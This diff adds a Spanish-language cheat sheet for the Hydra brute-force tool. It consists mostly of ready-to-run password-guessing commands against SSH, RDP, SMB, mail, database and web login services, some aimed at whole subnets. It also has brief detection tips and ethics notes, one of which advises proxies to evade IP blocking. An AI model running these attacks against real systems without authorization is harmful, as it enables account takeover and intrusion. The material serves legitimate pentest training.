@@ -1,0 +1,156 @@
+# HYDRA - BRUTE FORCE ATTACK TOOL
+
+## Descripción
+Hydra es una herramienta de fuerza bruta muy rápida que soporta múltiples protocolos.
+Se utiliza para realizar ataques de diccionario contra servicios de red.
+
+## Ejemplo Real
+Imagina que encontraste un servidor SSH en 192.168.1.100 durante un pentest.
+Sospechas que el usuario "admin" tiene una contraseña débil. Usarías:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+## Comandos Básicos
+hydra -l usuario -p contraseña protocolo://ip     # Login único
+hydra -l usuario -P diccionario protocolo://ip    # Usuario fijo, diccionario
+hydra -L usuarios -p contraseña protocolo://ip    # Lista usuarios, password fijo
+hydra -L usuarios -P diccionario protocolo://ip   # Ambas listas
+
+## Protocolos Soportados
+# SSH
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+
+# FTP
+hydra -l admin -P passwords.txt ftp://192.168.1.10
+
+# HTTP POST (formulario login)
+hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+
+# HTTP Basic Auth
+hydra -l admin -P passwords.txt 192.168.1.10 http-get /admin/
+
+# HTTPS
+hydra -l admin -P passwords.txt https-get://192.168.1.10/
+
+# MySQL
+hydra -l root -P passwords.txt mysql://192.168.1.10
+
+# SMTP
+hydra -l user@domain.com -P passwords.txt smtp://mail.domain.com
+
+# POP3
+hydra -l user -P passwords.txt pop3://mail.domain.com
+
+# IMAP
+hydra -l user -P passwords.txt imap://mail.domain.com
+
+# RDP (Windows Remote Desktop)
+hydra -l administrator -P passwords.txt rdp://192.168.1.10
+
+# SMB/NetBIOS
+hydra -l administrator -P passwords.txt smb://192.168.1.10
+
+# Telnet
+hydra -l admin -P passwords.txt telnet://192.168.1.10
+
+# VNC
+hydra -P passwords.txt vnc://192.168.1.10
+
+## Opciones Avanzadas
+-t 4                              # Número de tareas paralelas (default: 16)
+-T 4                              # Número de conexiones paralelas por tarea
+-w 3                              # Tiempo de espera en segundos
+-f                                # Salir después del primer login exitoso
+-F                                # Salir después del primer login exitoso para cualquier host
+-v                                # Verbose (mostrar intentos)
+-V                                # Muy verbose (mostrar login/password para cada intento)
+-d                                # Debug mode
+-q                                # Quiet mode (no mostrar intentos)
+-x                                # Formato: min:max:charset para generar passwords
+-e nsr                            # Intentos adicionales: n=null, s=login as pass, r=reverse login
+-o archivo.txt                    # Guardar resultados exitosos en archivo
+-b json                           # Formato de salida (texto, json, jsonv1)
+-I                                # Ignorar archivos de restauración previos
+-R                                # Restaurar sesión previa desde archivo .restore
+
+## Ejemplos Prácticos de Pentesting
+
+# 1. Ataque SSH con diccionario personalizado
+hydra -l root -P custom_passwords.txt -t 6 -V ssh://10.10.10.20
+
+# 2. Fuerza bruta FTP con múltiples usuarios
+hydra -L userlist.txt -P passlist.txt -f -V ftp://192.168.1.5
+
+# 3. Ataque HTTP formulario de login (WordPress)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:ERROR"
+
+# 4. MySQL con generación automática de contraseñas
+hydra -l root -x 6:8:aA1 mysql://192.168.1.50
+
+# 5. SMB en red local con timeout personalizado
+hydra -L users.txt -P passwords.txt -w 5 -t 1 smb://192.168.1.0/24
+
+# 6. HTTPS con autenticación básica
+hydra -l admin -P rockyou.txt -s 443 -f https-get://secure.example.com/admin
+
+# 7. POP3 con salida en JSON
+hydra -l user@company.com -P emails_passwords.txt -b json -o results.json pop3://mail.company.com
+
+## Casos de Uso en Auditorías
+
+# Escenario 1: Servidor web corporativo
+# Objetivo: Probar la fortaleza de contraseñas del panel administrativo
+hydra -l administrator -P /usr/share/wordlists/fasttrack.txt 192.168.10.50 http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# Escenario 2: Infraestructura Windows
+# Objetivo: Verificar cuentas administrativas en RDP
+hydra -L domain_admins.txt -P common_passwords.txt -t 1 -w 10 rdp://192.168.10.0/24
+
+# Escenario 3: Servicios de correo
+# Objetivo: Auditar buzones de correo corporativo
+hydra -L email_addresses.txt -P corporate_passwords.txt -t 3 smtp://mail.corporation.com
+
+## Integración con Otras Herramientas
+
+# Usar con Nmap para descubrimiento previo
+nmap -p 22,21,80,443,3389 192.168.1.0/24 | grep open
+hydra -L users.txt -P passwords.txt ssh://[IP_encontrada]
+
+# Combinar con Medusa para comparar resultados
+medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh
+hydra -l admin -P passwords.txt ssh://192.168.1.10
+
+# Usar con Crackmapexec para redes Windows
+crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
+hydra -L users.txt -P passwords.txt smb://192.168.1.10
+
+## Defensa y Contramedidas
+
+# Detectar ataques de Hydra
+grep "Failed password" /var/log/auth.log | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq -c | sort -nr
+
+# Configurar fail2ban contra fuerza bruta
+fail2ban-client status sshd
+
+# Monitorear conexiones SSH sospechosas
+watch -n 1 'netstat -ant | grep :22 | grep ESTABLISHED'
+
+## Notas de Seguridad y Ética
+- Solo usar en sistemas propios o con autorización explícita
+- Documentar todos los intentos en informes de auditoría
+- Respetar las políticas de bloqueo de cuentas
+- Coordinar con el equipo de sistemas para evitar interrupciones
+- Usar proxies/VPN en entornos de producción para evitar bloqueos IP
+
+## Tips de Rendimiento
+- Ajustar -t según la capacidad del objetivo (no sobrecargar)
+- Usar listas de contraseñas específicas del contexto
+- Implementar pausas entre intentos con -w
+- Guardar progreso con archivos .restore para sesiones largas
+- Verificar logs del objetivo para detectar bloqueos
+
+## Archivos de Diccionarios Recomendados
+/usr/share/wordlists/rockyou.txt                  # Más popular
+/usr/share/wordlists/fasttrack.txt                # Rápido y efectivo
+/usr/share/seclists/Passwords/Common-Credentials/ # Credenciales comunes
+/usr/share/wordlists/dirb/common.txt              # Passwords básicos
+/usr/share/wordlists/metasploit/common_roots.txt  # Usuarios root comunes
